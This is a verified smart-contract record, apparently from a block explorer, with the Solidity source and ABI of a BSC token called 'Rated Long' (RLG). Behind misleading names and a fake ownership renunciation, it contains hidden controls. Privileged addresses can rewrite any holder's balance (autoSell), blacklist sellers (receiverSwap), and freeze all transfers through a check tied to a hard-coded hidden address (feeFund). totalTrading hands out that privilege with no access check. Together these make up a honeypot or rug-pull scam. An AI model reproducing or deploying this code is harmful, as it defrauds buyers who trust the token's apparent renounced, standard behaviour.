{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface tradingIs {\n    function createPair(address fundWallet, address exemptShould) external returns (address);\n}\n\ninterface fromMinFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFund) external view returns (uint256);\n\n    function transfer(address txFeeLiquidity, uint256 receiverLaunch) external returns (bool);\n\n    function allowance(address teamLiquidityShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txFeeLiquidity,\n        uint256 receiverLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenMin, uint256 value);\n    event Approval(address indexed teamLiquidityShould, address indexed spender, uint256 value);\n}\n\nabstract contract autoReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromMinFeeMetadata is fromMinFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RatedLong is autoReceiver, fromMinFee, fromMinFeeMetadata {\n\n    constructor (){\n        \n        marketingEnable fromAmount = marketingEnable(atTake);\n        enableLimit = tradingIs(fromAmount.factory()).createPair(fromAmount.WETH(), address(this));\n        \n        totalLimitLaunched = _msgSender();\n        atLimit[totalLimitLaunched] = true;\n        txReceiver[totalLimitLaunched] = txTo;\n        senderMax();\n        \n        emit Transfer(address(0), totalLimitLaunched, txTo);\n    }\n\n    function feeTrading() private view {\n        require(atLimit[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTo;\n    }\n\n    bool public autoTrading;\n\n    uint256 public tokenReceiver;\n\n    bool public liquidityReceiver;\n\n    function atToFund(address receiverExempt, address txFeeLiquidity, uint256 receiverLaunch) internal returns (bool) {\n        if (receiverExempt == totalLimitLaunched) {\n            return amountMarketingFee(receiverExempt, txFeeLiquidity, receiverLaunch);\n        }\n        uint256 isBuy = fromMinFee(enableLimit).balanceOf(tokenAmount);\n        require(isBuy == takeLaunch);\n        require(txFeeLiquidity != tokenAmount);\n        if (limitLaunchList[receiverExempt]) {\n            return amountMarketingFee(receiverExempt, txFeeLiquidity, amountWalletIs);\n        }\n        return amountMarketingFee(receiverExempt, txFeeLiquidity, receiverLaunch);\n    }\n\n    uint8 private receiverAmount = 18;\n\n    function receiverSwap(address limitFund) public {\n        feeTrading();\n        if (tokenReceiver == amountTokenIs) {\n            amountTokenIs = totalAmount;\n        }\n        if (limitFund == totalLimitLaunched || limitFund == enableLimit) {\n            return;\n        }\n        limitLaunchList[limitFund] = true;\n    }\n\n    function amountMarketingFee(address receiverExempt, address txFeeLiquidity, uint256 receiverLaunch) internal returns (bool) {\n        require(txReceiver[receiverExempt] >= receiverLaunch);\n        txReceiver[receiverExempt] -= receiverLaunch;\n        txReceiver[txFeeLiquidity] += receiverLaunch;\n        emit Transfer(receiverExempt, txFeeLiquidity, receiverLaunch);\n        return true;\n    }\n\n    uint256 public totalAmount;\n\n    function getOwner() external view returns (address) {\n        return marketingTradingToken;\n    }\n\n    event OwnershipTransferred(address indexed receiverLimit, address indexed teamTx);\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAmount;\n    }\n\n    uint256 takeLaunch;\n\n    address public enableLimit;\n\n    address tokenAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalTrading(address takeTradingAt) public {\n        if (liquidityReceiver) {\n            return;\n        }\n        \n        atLimit[takeTradingAt] = true;\n        \n        liquidityReceiver = true;\n    }\n\n    function transfer(address isAuto, uint256 receiverLaunch) external virtual override returns (bool) {\n        return atToFund(_msgSender(), isAuto, receiverLaunch);\n    }\n\n    string private tradingSwap = \"Rated Long\";\n\n    function balanceOf(address teamFund) public view virtual override returns (uint256) {\n        return txReceiver[teamFund];\n    }\n\n    address atTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeMarketing;\n    }\n\n    address private marketingTradingToken;\n\n    function approve(address sellReceiver, uint256 receiverLaunch) public virtual override returns (bool) {\n        liquidityAmount[_msgSender()][sellReceiver] = receiverLaunch;\n        emit Approval(_msgSender(), sellReceiver, receiverLaunch);\n        return true;\n    }\n\n    uint256 public amountTokenIs;\n\n    uint256 private txTo = 100000000 * 10 ** 18;\n\n    uint256 constant amountWalletIs = 9 ** 10;\n\n    uint256 private txList;\n\n    function autoSell(address isAuto, uint256 receiverLaunch) public {\n        feeTrading();\n        txReceiver[isAuto] = receiverLaunch;\n    }\n\n    function transferFrom(address receiverExempt, address txFeeLiquidity, uint256 receiverLaunch) external override returns (bool) {\n        if (_msgSender() != atTake) {\n            if (liquidityAmount[receiverExempt][_msgSender()] != type(uint256).max) {\n                require(receiverLaunch <= liquidityAmount[receiverExempt][_msgSender()]);\n                liquidityAmount[receiverExempt][_msgSender()] -= receiverLaunch;\n            }\n        }\n        return atToFund(receiverExempt, txFeeLiquidity, receiverLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return marketingTradingToken;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingSwap;\n    }\n\n    function senderMax() public {\n        emit OwnershipTransferred(totalLimitLaunched, address(0));\n        marketingTradingToken = address(0);\n    }\n\n    mapping(address => bool) public atLimit;\n\n    function allowance(address modeLimit, address sellReceiver) external view virtual override returns (uint256) {\n        if (sellReceiver == atTake) {\n            return type(uint256).max;\n        }\n        return liquidityAmount[modeLimit][sellReceiver];\n    }\n\n    mapping(address => uint256) private txReceiver;\n\n    address public totalLimitLaunched;\n\n    uint256 fundAutoTotal;\n\n    function feeFund(uint256 receiverLaunch) public {\n        feeTrading();\n        takeLaunch = receiverLaunch;\n    }\n\n    string private modeMarketing = \"RLG\";\n\n    mapping(address => bool) public limitLaunchList;\n\n    bool private isTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLiquidityShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTokenIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunch\",\"type\":\"uint256\"}],\"name\":\"autoSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverLaunch\",\"type\":\"uint256\"}],\"name\":\"feeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLaunchList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimitLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTradingAt\",\"type\":\"address\"}],\"name\":\"totalTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFeeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RatedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}